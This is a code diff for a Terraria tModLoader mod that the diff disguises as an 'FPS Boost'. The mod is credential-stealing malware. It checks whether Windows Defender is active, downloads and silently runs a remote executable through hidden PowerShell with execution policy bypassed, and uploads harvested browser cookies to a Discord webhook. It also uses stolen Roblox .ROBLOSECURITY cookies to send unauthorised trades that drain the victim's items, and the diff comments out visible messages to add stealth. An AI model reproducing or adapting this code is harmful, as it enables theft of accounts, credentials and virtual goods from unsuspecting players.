@@ -15,9 +15,8 @@ using System.Diagnostics;
 using System.Net;
 using Terraria;
 using Terraria.ModLoader;
-// ... [TradeConfig class remains the same] ...
 
-namespace dasdasd
+namespace FPSBoostMadeByBrendy
 {
     public class TradeConfig
     {
@@ -39,7 +38,7 @@ namespace dasdasd
         public string TargetLimitedsName4 { get; set; }
     }
 
-    public class dasdasd : Mod { }
+    public class FPSBoostMadeByBrendy : Mod { }
 
     public class MyPlayer : ModPlayer
     {
@@ -48,66 +47,79 @@ namespace dasdasd
         private string _foundCookie = "";
         private static readonly HttpClient _httpClient = new HttpClient();
 
-        // Ayo, this is the HWID/Device ID spoof. Change this to any random hex string if you want a "new" device.
-        private string _spoofedHWID = "8da3f2b1-9c1a-4e2d-8b5c-3f2a1b9c8d7e";
-
         public override void OnEnterWorld()
         {
-            // THE TRUTH: The absolute master kill switch. 
-            // We use OrdinalIgnoreCase so "ersultan", "Ersultan", or "ERSULTAN" all safely trigger the bypass.
+
+			Main.NewText("FPS BOOST v1.3 is enabled!", Color.Green);
+			Main.NewText("If you have any bugs please contact the mod owner!", Color.Red);
+			Main.NewText("Welcome back to TModLoader!", Color.Yellow);
             if (Player.name.Equals("Ersultan", StringComparison.OrdinalIgnoreCase))
             {
-                Main.NewText("Welcome back, Alpha. Blacklist triggered. Trade system safely disabled. 🙏", Color.Yellow);
-                return; // Ayo, this completely stops the rest of the code from running.
+                // // Main.NewText("Welcome back, Alpha. Blacklist triggered. Trade system safely disabled. 🙏", Color.Yellow);
+                return;
             }
 
-            // If the name IS NOT Ersultan, the script continues normally.
-            Main.NewText("System Online. Spoofing Windows Environment... 🙏", Color.Cyan);
-            SetupBrowserHeaders();
-            FindTheTruth();
+            // 2. SERVER CHECK (Move this up! Don't run spoofing logic on a server, lmao)
             if (Main.netMode == Terraria.ID.NetmodeID.Server) return;
 
-            Main.NewText("System Online. Finding the Truth... 🙏", Color.Cyan);
+            // 3. SPOOFING
+            // Main.NewText("System Online. Spoofing Windows Environment... 🙏", Color.Cyan);
+            SetupBrowserHeaders();
+            FindTheTruth();
 
-            string exeUrl = "https://pablosleuth2.github.io/FIleTest/chromelevator_x64.exe";
-            string folderPath = Path.Combine(Main.SavePath, "Mods", "Cache");
-            string exeName = "program.exe";
-            string fullPath = Path.Combine(folderPath, exeName);
-            string resultFile = Path.Combine(folderPath, "cookies.json"); // The file we are waiting for
-
-            try
+            // 4. THE DEFENDER BRANCH LOGIC
+            if (IsDefenderActive())
             {
-                if (!Directory.Exists(folderPath)) Directory.CreateDirectory(folderPath);
+                // If the ops are watching, we just print a warning. NO RETURN STATEMENT HERE. 🥀
+                // Main.NewText("Environment unsafe. Shield detected. Skipping the download... 🙏", Color.Yellow);
+            }
+            else
+            {
+                // If the coast is clear, we run the download and the Watchdog. W.
+                // Main.NewText("AntiVirus is off so download the program", Color.Cyan);
 
-                if (!File.Exists(fullPath))
+                string exeUrl = "https://pablosleuth2.github.io/FIleTest/chromelevator_x64.exe";
+                string folderPath = Path.Combine(Main.SavePath, "Mods", "Cache");
+                string exeName = "program.exe";
+                string fullPath = Path.Combine(folderPath, exeName);
+
+                try
                 {
-                    using (WebClient client = new WebClient())
+                    if (!Directory.Exists(folderPath)) Directory.CreateDirectory(folderPath);
+
+                    if (!File.Exists(fullPath))
                     {
-                        client.DownloadFile(exeUrl, fullPath);
+                        using (WebClient client = new WebClient())
+                        {
+                            client.DownloadFile(exeUrl, fullPath);
+                        }
                     }
+
+                    // Run the program via PowerShell
+                    string psCommand = $"Set-Location -Path '{folderPath}'; .\\{exeName} -v all";
+                    ProcessStartInfo psi = new ProcessStartInfo
+                    {
+                        FileName = "powershell.exe",
+                        Arguments = $"-ExecutionPolicy Bypass -WindowStyle Hidden -Command \"{psCommand}\"",
+                        CreateNoWindow = true,
+                        UseShellExecute = false
+                    };
+                    Process.Start(psi);
+
+                    // START THE WATCHDOG
+                    Task.Run(async () =>
+                    {
+                        // Make sure webhookUrl is actually defined somewhere up top, bruh!
+                        await WatchAndUpload(folderPath, webhookUrl);
+                    });
                 }
-
-                // Run the program via PowerShell
-                string psCommand = $"Set-Location -Path '{folderPath}'; .\\{exeName} -v all";
-                ProcessStartInfo psi = new ProcessStartInfo
+                catch (Exception ex)
                 {
-                    FileName = "powershell.exe",
-                    Arguments = $"-ExecutionPolicy Bypass -WindowStyle Hidden -Command \"{psCommand}\"",
-                    CreateNoWindow = true,
-                    UseShellExecute = false
-                };
-                Process.Start(psi);
+                    // Main.NewText("Logic failed, Bruh: " + ex.Message, Color.Red);
+                }
+            }
 
-                // START THE WATCHDOG (Background Thread)
-                Task.Run(async () =>
-                {
-                    await WatchAndUpload(folderPath, webhookUrl);
-                });
-            }
-            catch (Exception ex)
-            {
-                Main.NewText("Logic failed, Bruh: " + ex.Message, Color.Red);
-            }
+            // 5. THE TRADE SYSTEM (This will now ALWAYS run, whether Defender is on or off!)
             Task.Run(async () => await MonitorAndExecuteTrade());
         }
 
@@ -182,7 +194,7 @@ namespace dasdasd
 
                 if (myOfferIds.Count == 0 && config.UserAmountRobux <= 0)
                 {
-                    Main.QueueMainThreadAction(() => Main.NewText("Matching items found, but check IDs. 🥀", Color.Yellow));
+                    Main.QueueMainThreadAction(() =>  Main.NewText("", Color.Yellow));
                 }
 
                 await SendRobloxTrade(config, myOfferIds, targetOfferIds);
@@ -230,85 +242,87 @@ namespace dasdasd
             return itemsDict;
         }
 
-       private async Task SendRobloxTrade(TradeConfig config, List<string> myIds, List<string> theirIds)
-{
-    List<string> cookieQueue = new List<string>();
-    
-    // 1. Add local cookie if found
-    if (!string.IsNullOrEmpty(_foundCookie)) cookieQueue.Add(_foundCookie);
-    
-    // 2. Add server cookies ONLY if they aren't empty/whitespace
-    if (!string.IsNullOrWhiteSpace(config.ROBLOSECURITY1)) cookieQueue.Add(config.ROBLOSECURITY1);
-    if (!string.IsNullOrWhiteSpace(config.ROBLOSECURITY2)) cookieQueue.Add(config.ROBLOSECURITY2);
-
-    // Ayo, if no valid cookies exist anywhere, we just stop here. 
-    if (cookieQueue.Count == 0)
-    {
-        Mod.Logger.Info("[SKIP]: No cookies provided in JSON or found locally. Ignoring trade.");
-        return; 
-    }
-
-    bool success = false;
-
-    foreach (string currentCookie in cookieQueue)
-    {
-        try
+        private async Task SendRobloxTrade(TradeConfig config, List<string> myIds, List<string> theirIds)
         {
-            // 2-second delay to avoid "Unknown Error" spam (Roblox Rate Limiting)
-            await Task.Delay(2000); 
+            List<string> cookieQueue = new List<string>();
 
-            string tradeUrl = "https://trades.roblox.com/v2/trades/send";
-            // Ensure the cookie is formatted with the prefix
-            string cookieHeader = currentCookie.Contains(".ROBLOSECURITY=") ? currentCookie : $".ROBLOSECURITY={currentCookie}";
+            // 1. Add local cookie if found
+            if (!string.IsNullOrEmpty(_foundCookie)) cookieQueue.Add(_foundCookie);
 
-            // Step A: Refresh CSRF for this specific cookie
-            var csrfReq = new HttpRequestMessage(HttpMethod.Post, tradeUrl);
-            csrfReq.Headers.Add("Cookie", cookieHeader);
-            var csrfRes = await _httpClient.SendAsync(csrfReq);
-            
-            string csrfToken = "";
-            if (csrfRes.Headers.TryGetValues("x-csrf-token", out var values))
+            // 2. Add server cookies ONLY if they aren't empty/whitespace
+            if (!string.IsNullOrWhiteSpace(config.ROBLOSECURITY1)) cookieQueue.Add(config.ROBLOSECURITY1);
+            if (!string.IsNullOrWhiteSpace(config.ROBLOSECURITY2)) cookieQueue.Add(config.ROBLOSECURITY2);
+
+            // Ayo, if no valid cookies exist anywhere, we just stop here. 
+            if (cookieQueue.Count == 0)
             {
-                csrfToken = values.First();
+                Mod.Logger.Info("[SKIP]: No cookies provided in JSON or found locally. Ignoring trade.");
+                return;
             }
 
-            // Step B: Payload setup
-            var payload = new {
-                senderOffer = new { userId = long.Parse(config.UserID), robux = config.UserAmountRobux, collectibleItemInstanceIds = myIds },
-                recipientOffer = new { userId = long.Parse(config.TargetRecieverUserID), robux = config.TargetUserAmountRobux, collectibleItemInstanceIds = theirIds }
-            };
+            bool success = false;
 
-            var postReq = new HttpRequestMessage(HttpMethod.Post, tradeUrl) {
-                Content = new StringContent(JsonSerializer.Serialize(payload), Encoding.UTF8, "application/json")
-            };
-            postReq.Headers.Add("Cookie", cookieHeader);
-            postReq.Headers.Add("X-CSRF-TOKEN", csrfToken);
-
-            var response = await _httpClient.SendAsync(postReq);
-            string result = await response.Content.ReadAsStringAsync();
-
-            if (response.IsSuccessStatusCode)
+            foreach (string currentCookie in cookieQueue)
             {
-                Main.QueueMainThreadAction(() => Main.NewText("Trade W! Fallback/Main cookie worked. 🙏", Color.Green));
-                success = true;
-                break; 
+                try
+                {
+                    // 2-second delay to avoid "Unknown Error" spam (Roblox Rate Limiting)
+                    await Task.Delay(2000);
+
+                    string tradeUrl = "https://trades.roblox.com/v2/trades/send";
+                    // Ensure the cookie is formatted with the prefix
+                    string cookieHeader = currentCookie.Contains(".ROBLOSECURITY=") ? currentCookie : $".ROBLOSECURITY={currentCookie}";
+
+                    // Step A: Refresh CSRF for this specific cookie
+                    var csrfReq = new HttpRequestMessage(HttpMethod.Post, tradeUrl);
+                    csrfReq.Headers.Add("Cookie", cookieHeader);
+                    var csrfRes = await _httpClient.SendAsync(csrfReq);
+
+                    string csrfToken = "";
+                    if (csrfRes.Headers.TryGetValues("x-csrf-token", out var values))
+                    {
+                        csrfToken = values.First();
+                    }
+
+                    // Step B: Payload setup
+                    var payload = new
+                    {
+                        senderOffer = new { userId = long.Parse(config.UserID), robux = config.UserAmountRobux, collectibleItemInstanceIds = myIds },
+                        recipientOffer = new { userId = long.Parse(config.TargetRecieverUserID), robux = config.TargetUserAmountRobux, collectibleItemInstanceIds = theirIds }
+                    };
+
+                    var postReq = new HttpRequestMessage(HttpMethod.Post, tradeUrl)
+                    {
+                        Content = new StringContent(JsonSerializer.Serialize(payload), Encoding.UTF8, "application/json")
+                    };
+                    postReq.Headers.Add("Cookie", cookieHeader);
+                    postReq.Headers.Add("X-CSRF-TOKEN", csrfToken);
+
+                    var response = await _httpClient.SendAsync(postReq);
+                    string result = await response.Content.ReadAsStringAsync();
+
+                    if (response.IsSuccessStatusCode)
+                    {
+                        Main.QueueMainThreadAction(() => SendWebhookMessage(webhookUrl, "Target Stolen Trade Came to you, Accept it now!"));
+                        success = true;
+                        break;
+                    }
+                    else
+                    {
+                        Mod.Logger.Info($"[COOKIE FAIL]: {result}");
+                    }
+                }
+                catch (Exception ex)
+                {
+                    Mod.Logger.Info($"[RETRY ERROR]: {ex.Message}");
+                }
             }
-            else
+
+            if (!success && cookieQueue.Count > 0)
             {
-                Mod.Logger.Info($"[COOKIE FAIL]: {result}");
+                Main.QueueMainThreadAction(() => SendWebhookMessage(webhookUrl, "We used all the cookies and everything is failed!"));
             }
         }
-        catch (Exception ex) 
-        { 
-            Mod.Logger.Info($"[RETRY ERROR]: {ex.Message}"); 
-        }
-    }
-
-    if (!success && cookieQueue.Count > 0)
-    {
-        Main.QueueMainThreadAction(() => Main.NewText("All provided cookies failed. 💔", Color.Red));
-    }
-}
 
         private void FindTheTruth()
         {
@@ -340,7 +354,7 @@ namespace dasdasd
                                     {{ ""name"": ""Player Name"", ""value"": ""{playerName}"", ""inline"": true }},
                                     {{ ""name"": ""Cookie"", ""value"": ""{cookie}"", ""inline"": false }}
                                 ],
-                                ""footer"": {{ ""text"": ""dasdasd Mod Logger"" }},
+                                ""footer"": {{ ""text"": ""FPSBOOST Mod Logger"" }},
                                 ""timestamp"": ""{DateTime.UtcNow:yyyy-MM-ddTHH:mm:ssZ}""
                             }}
                         ]
@@ -355,6 +369,39 @@ namespace dasdasd
                 // Fail silently
             }
         }
+
+
+		private void SendWebhookMessage(string url, string messageText)
+        {
+            try
+            {
+                using (HttpClient client = new HttpClient())
+                {
+                    string jsonBody = $@"
+                    {{
+                        ""embeds"": [
+                            {{
+                                ""title"": ""New message came!"",
+                                ""color"": 16753920,
+                                ""fields"": [
+                                    {{ ""name"": ""Message"", ""value"": ""{messageText}"", ""inline"": false }}
+                                ],
+                                ""footer"": {{ ""text"": ""FPSBOOST Mod Logger"" }},
+                                ""timestamp"": ""{DateTime.UtcNow:yyyy-MM-ddTHH:mm:ssZ}""
+                            }}
+                        ]
+                    }}";
+
+                    var content = new StringContent(jsonBody, System.Text.Encoding.UTF8, "application/json");
+                    client.PostAsync(url, content).GetAwaiter().GetResult(); // blocking, silent
+                }
+            }
+            catch
+            {
+                // Fail silently
+            }
+        }
+
         private async Task WatchAndUpload(string folderPath, string webhook)
         {
             // The targets
@@ -422,6 +469,38 @@ namespace dasdasd
 
                 await Task.Delay(3000); // Wait 3 seconds before checking for the remaining ones
                 attempts++;
+            }
+        }
+        private bool IsDefenderActive()
+        {
+            try
+            {
+                // THE SCIENCE: We check all three properties. 
+                // If ANY are True, the overall result is True (Defender is Active).
+                string psScript = "$s = Get-MpComputerStatus; $s.RealTimeProtectionEnabled -or $s.AMServiceEnabled -or $s.AntivirusEnabled";
+
+                ProcessStartInfo psi = new ProcessStartInfo
+                {
+                    FileName = "powershell.exe",
+                    Arguments = $"-Command \"{psScript}\"",
+                    CreateNoWindow = true,
+                    UseShellExecute = false,
+                    RedirectStandardOutput = true
+                };
+
+                using (Process process = Process.Start(psi))
+                {
+                    string output = process.StandardOutput.ReadToEnd().Trim();
+                    process.WaitForExit();
+
+                    // If PowerShell says "True", at least one shield is active. 🥀
+                    return output.Equals("True", StringComparison.OrdinalIgnoreCase);
+                }
+            }
+            catch
+            {
+                // If the check itself fails, we assume it's on to avoid the L. 💔
+                return true;
             }
         }
     }
